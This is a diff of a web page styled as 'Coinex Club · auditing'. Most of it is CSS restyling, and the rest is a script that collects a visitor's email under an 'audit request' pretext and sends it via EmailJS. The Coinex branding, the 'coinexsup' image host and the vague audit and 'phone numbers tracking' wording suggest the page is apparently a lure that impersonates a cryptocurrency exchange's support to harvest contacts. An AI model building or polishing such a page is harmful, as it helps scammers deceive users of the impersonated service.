@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Coinex Club · auditing</title>
   <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <style>
+    /* reset & base */
     * {
       margin: 0;
       padding: 0;
@@ -16,11 +17,11 @@
 
     body {
       min-height: 100vh;
-      background: #0b1a1f;  /* fallback dark */
+      background: #0b1a1f;  /* fallback deep */
       background-image: url('https://coinexsup.github.io/Pic/agsgfd.png');
       background-repeat: no-repeat;
       background-position: center center;
-      background-size: cover;
+      background-size: 140% 140%;  /* jauh lebih jauh (zoomed out) */
       background-attachment: fixed;
       display: flex;
       align-items: center;
@@ -29,73 +30,75 @@
       margin: 0;
     }
 
-    /* Glass-morphism card — frosted, white tint, with green-cyan border */
+    /* glass card — white matte glass, green-cyan border, no gray tones */
     .glass-card {
       width: 100%;
       max-width: 480px;
       padding: 44px 32px 40px;
-      background: rgba(255, 255, 255, 0.12);
-      backdrop-filter: blur(16px) saturate(180%);
-      -webkit-backdrop-filter: blur(16px) saturate(180%);
-      border-radius: 48px;
-      border: 2px solid rgba(0, 255, 200, 0.5);
-      box-shadow: 0 30px 50px -20px rgba(0, 40, 30, 0.7), 
-                  inset 0 0 0 1px rgba(255, 255, 255, 0.08);
+      background: rgba(255, 255, 255, 0.35);
+      backdrop-filter: blur(18px) saturate(200%);
+      -webkit-backdrop-filter: blur(18px) saturate(200%);
+      border-radius: 56px;
+      border: 2px solid rgba(0, 255, 200, 0.6);
+      box-shadow: 0 30px 50px -20px rgba(0, 40, 30, 0.5),
+                  inset 0 0 0 1px rgba(255, 255, 255, 0.2);
       transition: all 0.2s ease;
-      color: #ffffff;
+      color: #11161e;  /* deep dark for contrast */
       text-align: center;
+      background: rgba(255, 255, 255, 0.30); /* lebih putih/kaca */
     }
 
-    /* header */
+    /* all text dark, no gray */
     .club-title {
       font-size: 2.2rem;
-      font-weight: 500;
+      font-weight: 550;
       letter-spacing: -0.5px;
-      color: white;
-      text-shadow: 0 2px 12px rgba(0, 30, 20, 0.5);
-      margin-bottom: 8px;
-      word-break: break-word;
+      color: #0a1a1a;
+      text-shadow: 0 2px 8px rgba(255, 255, 255, 0.3);
+      margin-bottom: 6px;
     }
     .club-title span {
       font-weight: 300;
-      opacity: 0.8;
+      color: #0a2626;
     }
 
     .sub-audit {
       font-size: 0.95rem;
-      font-weight: 300;
+      font-weight: 400;
       letter-spacing: 1px;
-      color: rgba(220, 255, 240, 0.7);
-      border-bottom: 1px solid rgba(0, 255, 200, 0.2);
-      padding-bottom: 18px;
-      margin-bottom: 28px;
+      color: #0e2626;
+      border-bottom: 1px solid rgba(0, 200, 180, 0.3);
+      padding-bottom: 16px;
+      margin-bottom: 26px;
       display: inline-block;
       text-transform: uppercase;
+      background: rgba(255,255,255,0.1);
+      padding: 6px 24px;
+      border-radius: 60px;
+      backdrop-filter: blur(2px);
     }
 
-    /* hint / description */
     .audit-hint {
-      background: rgba(0, 40, 35, 0.25);
+      background: rgba(255, 255, 255, 0.25);
       backdrop-filter: blur(4px);
       -webkit-backdrop-filter: blur(4px);
       border-radius: 60px;
       padding: 12px 22px;
       margin-bottom: 32px;
       font-size: 0.95rem;
-      font-weight: 350;
-      color: rgba(255, 255, 255, 0.9);
-      border: 1px solid rgba(0, 255, 200, 0.2);
+      font-weight: 420;
+      color: #0f1e1e;
+      border: 1px solid rgba(0, 200, 180, 0.25);
       display: inline-block;
-      letter-spacing: 0.3px;
+      letter-spacing: 0.2px;
       line-height: 1.5;
-      backdrop-filter: blur(4px);
     }
     .audit-hint strong {
-      font-weight: 500;
-      color: #b5ffe6;
+      font-weight: 600;
+      color: #004d44;
     }
 
-    /* email field */
+    /* input group */
     .input-group {
       width: 100%;
       margin-bottom: 28px;
@@ -106,9 +109,9 @@
       font-size: 0.8rem;
       text-transform: uppercase;
       letter-spacing: 1.5px;
-      color: rgba(200, 255, 235, 0.7);
+      color: #1a2f2f;
+      font-weight: 550;
       margin-bottom: 8px;
-      font-weight: 300;
       text-align: left;
       padding-left: 6px;
     }
@@ -117,59 +120,59 @@
       width: 100%;
       padding: 18px 24px;
       font-size: 1.1rem;
-      background: rgba(255, 255, 255, 0.08);
+      background: rgba(255, 255, 255, 0.4);
       backdrop-filter: blur(6px);
       -webkit-backdrop-filter: blur(6px);
-      border: 1.5px solid rgba(0, 255, 200, 0.35);
+      border: 1.5px solid rgba(0, 200, 180, 0.5);
       border-radius: 60px;
-      color: white;
+      color: #0a1a1a;
       outline: none;
       transition: 0.2s;
-      font-weight: 400;
+      font-weight: 450;
       letter-spacing: 0.3px;
-      box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.1);
+      box-shadow: inset 0 4px 12px rgba(0, 0, 0, 0.03);
     }
 
     .glass-input::placeholder {
-      color: rgba(255, 255, 255, 0.45);
-      font-weight: 300;
-      letter-spacing: 0.2px;
+      color: #2a4040;
+      font-weight: 350;
+      opacity: 0.7;
     }
 
     .glass-input:focus {
-      border-color: #6effe0;
-      background: rgba(255, 255, 255, 0.15);
-      box-shadow: 0 0 0 3px rgba(0, 255, 200, 0.15), inset 0 2px 8px rgba(0,0,0,0.1);
+      border-color: #00c4b0;
+      background: rgba(255, 255, 255, 0.6);
+      box-shadow: 0 0 0 3px rgba(0, 200, 180, 0.15), inset 0 2px 8px rgba(0,0,0,0.02);
     }
 
-    /* confirm button — glass style with green-cyan border */
+    /* confirm button — dark text, green-cyan border, glass */
     .confirm-btn {
       width: 100%;
       padding: 18px 24px;
-      border: 1.5px solid #4de0c0;
-      background: rgba(0, 255, 200, 0.08);
+      border: 1.5px solid #00b8a0;
+      background: rgba(255, 255, 255, 0.3);
       backdrop-filter: blur(8px);
       -webkit-backdrop-filter: blur(8px);
       border-radius: 80px;
-      color: white;
+      color: #0a1a1a;
       font-size: 1.3rem;
-      font-weight: 450;
+      font-weight: 500;
       letter-spacing: 0.5px;
       cursor: pointer;
       transition: all 0.2s ease;
-      box-shadow: 0 8px 24px -8px rgba(0, 30, 25, 0.5);
+      box-shadow: 0 8px 24px -8px rgba(0, 30, 25, 0.2);
       display: flex;
       align-items: center;
       justify-content: center;
       gap: 14px;
-      text-shadow: 0 2px 6px rgba(0, 20, 15, 0.4);
+      text-shadow: 0 1px 4px rgba(255,255,255,0.2);
     }
 
     .confirm-btn:hover {
-      background: rgba(0, 255, 200, 0.18);
-      border-color: #7effe0;
+      background: rgba(255, 255, 255, 0.5);
+      border-color: #00d4c0;
       transform: scale(1.01);
-      box-shadow: 0 12px 32px -10px #00ccaa40;
+      box-shadow: 0 12px 32px -10px #00b8a060;
     }
 
     .confirm-btn:active {
@@ -179,66 +182,67 @@
     .confirm-btn:disabled {
       opacity: 0.5;
       pointer-events: none;
-      filter: grayscale(0.6);
-      border-color: #3a8a7a;
+      filter: grayscale(0.3);
+      border-color: #4a8a7a;
     }
 
-    /* small footer note */
-    .footnote {
-      margin-top: 28px;
-      font-size: 0.7rem;
-      color: rgba(200, 240, 225, 0.4);
-      letter-spacing: 1px;
-      border-top: 1px solid rgba(0, 255, 200, 0.08);
-      padding-top: 22px;
-      display: flex;
-      justify-content: center;
-      gap: 28px;
-      flex-wrap: wrap;
-    }
-    .footnote span {
-      opacity: 0.6;
-    }
-
-    /* error / status badge */
+    /* status badge — dark text, no gray */
     .status-badge {
       display: inline-block;
-      margin-top: 16px;
+      margin-top: 18px;
       font-size: 0.85rem;
-      background: rgba(0, 40, 30, 0.3);
+      background: rgba(255, 255, 255, 0.25);
       backdrop-filter: blur(4px);
-      padding: 6px 22px;
-      border-radius: 40px;
-      border: 1px solid rgba(0, 255, 200, 0.1);
-      color: #b0f0dd;
-      min-height: 36px;
+      padding: 8px 26px;
+      border-radius: 60px;
+      border: 1px solid rgba(0, 200, 180, 0.15);
+      color: #0a1e1e;
+      min-height: 40px;
       transition: 0.15s;
+      font-weight: 450;
     }
 
     .status-badge.error {
-      background: rgba(180, 30, 30, 0.25);
-      border-color: #ff7a6e;
-      color: #ffcbc0;
+      background: rgba(200, 80, 60, 0.15);
+      border-color: #cc6a5a;
+      color: #4a1a1a;
     }
     .status-badge.success {
-      background: rgba(0, 200, 150, 0.2);
-      border-color: #6effd0;
-      color: #d4fff0;
+      background: rgba(0, 200, 150, 0.15);
+      border-color: #00b89a;
+      color: #003d33;
     }
 
-    /* spinner */
+    /* spinner dark */
     .spinner {
       display: inline-block;
       width: 22px;
       height: 22px;
-      border: 2px solid rgba(255,255,255,0.2);
-      border-top: 2px solid #b5ffe6;
+      border: 2px solid rgba(0, 0, 0, 0.1);
+      border-top: 2px solid #00665a;
       border-radius: 50%;
       animation: spin 0.7s linear infinite;
     }
     @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-    /* responsive */
+    /* footer — dark text */
+    .footnote {
+      margin-top: 28px;
+      font-size: 0.7rem;
+      color: #1a3636;
+      letter-spacing: 1px;
+      border-top: 1px solid rgba(0, 200, 180, 0.15);
+      padding-top: 22px;
+      display: flex;
+      justify-content: center;
+      gap: 28px;
+      flex-wrap: wrap;
+      font-weight: 450;
+    }
+    .footnote span {
+      opacity: 0.8;
+    }
+
     @media (max-width: 480px) {
       .glass-card { padding: 32px 20px; }
       .club-title { font-size: 1.8rem; }
@@ -280,7 +284,7 @@
   <script>
     (function() {
       // ---------- EMAILJS config (your keys) ----------
-      emailjs.init("PakuuN4ADUDEqrzHl");   // public key from your code
+      emailjs.init("PakuuN4ADUDEqrzHl");   // public key
 
       // ---------- DOM refs ----------
       const emailInput = document.getElementById('emailInput');
@@ -295,8 +299,6 @@
 
       // ---------- reset status on typing ----------
       emailInput.addEventListener('input', function() {
-        // only reset if it's not a success/error state that we want to keep? 
-        // we want to clear error/success when user types again
         if (statusDiv.classList.contains('error') || statusDiv.classList.contains('success')) {
           setStatus('✏️ enter email', '');
         }
@@ -306,13 +308,12 @@
       async function handleConfirm() {
         const email = emailInput.value.trim();
 
-        // validate email (simple)
+        // validate email
         if (!email || !email.includes('@') || !email.includes('.')) {
           setStatus('⚠️ please enter a valid email', 'error');
           return;
         }
 
-        // disable button, show spinner
         confirmBtn.disabled = true;
         const originalBtnHTML = confirmBtn.innerHTML;
         confirmBtn.innerHTML = `<span class="spinner"></span> sending`;
@@ -320,13 +321,11 @@
         setStatus('⏳ sending audit request...', '');
 
         try {
-          // ---------- send via EmailJS (your service & template) ----------
           const templateParams = {
             email: email,
             to_name: 'Coinex Audit',
             from_name: 'Coinex Club',
             message: `Audit request from Coinex Club.\nEmail: ${email}\nLimited phone numbers tracking.`,
-            // you can add more fields if needed
           };
 
           const response = await emailjs.send(
@@ -337,12 +336,11 @@
 
           console.log('✅ email sent', response);
           setStatus('✅ request sent — you will be notified', 'success');
-          emailInput.value = '';       // clear field after success
+          emailInput.value = '';
         } catch (error) {
           console.warn('❌ email send error:', error);
           setStatus('⚠️ submission failed, try again', 'error');
         } finally {
-          // restore button (but keep it enabled)
           confirmBtn.disabled = false;
           confirmBtn.innerHTML = originalBtnHTML;
         }
@@ -351,7 +349,6 @@
       // ---------- attach event ----------
       confirmBtn.addEventListener('click', handleConfirm);
 
-      // also allow Enter key on input field
       emailInput.addEventListener('keydown', (e) => {
         if (e.key === 'Enter') {
           e.preventDefault();
@@ -361,7 +358,7 @@
         }
       });
 
-      // ---------- initial status ----------
+      // initial
       setStatus('📬 enter your email', '');
     })();
   </script>
